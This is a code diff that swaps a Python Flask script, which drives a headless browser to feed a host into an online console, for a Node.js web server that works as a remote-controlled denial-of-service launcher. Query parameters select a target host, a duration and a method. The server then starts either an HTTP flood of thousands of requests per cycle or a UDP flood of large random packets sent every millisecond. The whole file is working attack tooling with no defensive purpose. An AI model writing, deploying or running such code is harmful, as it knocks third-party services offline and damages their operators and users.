@@ -1,58 +1,80 @@
-from selenium import webdriver
-from selenium.common.exceptions import NoSuchElementException, WebDriverException
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.common.action_chains import ActionChains
-from fake_useragent import UserAgent
-from flask import Flask, render_template
-from flask import request
-import requests
-from requests.structures import CaseInsensitiveDict
-import time
-import os
+const req = require('request');
+var http = require('http');
+var url = require('url');
+var randomstring = require("randomstring");
+var dgram = require('dgram');
+var host;
+var time;
+var method;
 
-app = Flask(__name__)
+var server = http.createServer(function(request, response) {
+    var queryData = url.parse(request.url, true).query;
+    response.writeHead(200, {
+        "Content-Type": "text/plain"
+    });
 
+    if (queryData.host) {
+        host = queryData.host;
+        console.log(host)
 
-@app.route('/')
-def index():
-  host = request.args.get('host')
-  length = request.args.get('length')
-  method = request.args.get('method')
-  if host == None:
-    print("Please fill out the required!");
-  else:
-    print(host);
-    prehost = host;
-  if method == None:
-    print("Please fill out the required!");
-  else:
-    print(method);
-    premethod = method;
-  if length == None:
-    print("Please fill out the required!");
-  else:
-    print(length)
-    prelength = length;
-    execute();
-  return '{Executer: Online}'
+    } else {
+        response.end("Please fill out the required fields!");
+    }
+    if (queryData.time) {
+        time = queryData.time;
+        time = Number(time)
+        console.log(time)
 
+    } else {
+        response.end("Please fill out the required fields!");
+    }
+    if (queryData.method) {
+        method = queryData.method;
+        console.log(method)
+        if (method == "udp") {
+            console.log("UDP FLOOD");
+            udpflood();
+        } else {
+            // Do nothing
+        }
+        if (method == "http") {
+            console.log("HTTP FLOOD")
+            httpflood();
+        } else {
+            //Do Nothing
+        }
 
-def execute():
-    CHROMEDRIVER_PATH = os.environ.get('CHROMEDRIVER_PATH', '/usr/local/bin/chromedriver')
-    GOOGLE_CHROME_BIN = os.environ.get('GOOGLE_CHROME_BIN', '/usr/bin/google-chrome')
-    host = request.args.get('host')
-    length = request.args.get('length')
-    options = Options()
-    options.binary_location = GOOGLE_CHROME_BIN
-    options.add_argument('--disable-gpu')
-    options.add_argument('--no-sandbox')
-    options.headless = True
-    driver = webdriver.Chrome(executable_path=CHROMEDRIVER_PATH , options=options)
-    driver.get("https://trinket.io/python3/980ef28a2b")
-    driver.execute_script('document.getElementById("trinket-iframe").contentWindow.document.getElementsByClassName("jqconsole-prompt-text")[0].innerText="'+host+'"')
-    actions = ActionChains(driver)
-    actions.send_keys(Keys.RETURN)
-    actions.perform()
-    time.sleep(int(length))
-    driver.quit();
+    } else {
+        response.end("Please fill out the required fields!");
+    }
+
+    function httpflood() {
+        var requests = 10000;
+        var timesRun = 0;
+        var interval = setInterval(function() {
+            timesRun += 1;
+            if (timesRun === time) {
+                console.log("Attack ran for " + time + " seconds");
+                clearInterval(interval);
+            }
+            for (let i = requests; i--;)
+                req("http://" + host)
+            console.log("Attack Running on " + host + " with " + requests + " requets per second")
+
+        }, 2000)
+    }
+
+    function udpflood() {
+        setInterval(function() {
+            var client = dgram.createSocket('udp4');
+            var message = randomstring.generate(10000);
+            var port = Math.floor(Math.random() * (80) + 1);
+            client.send(message, 0, message.length, port, host, function(err, bytes) {
+                if (err) throw err;
+               //console.log(message);
+            });
+        }, 1);
+    }
+});
+
+server.listen(3000);
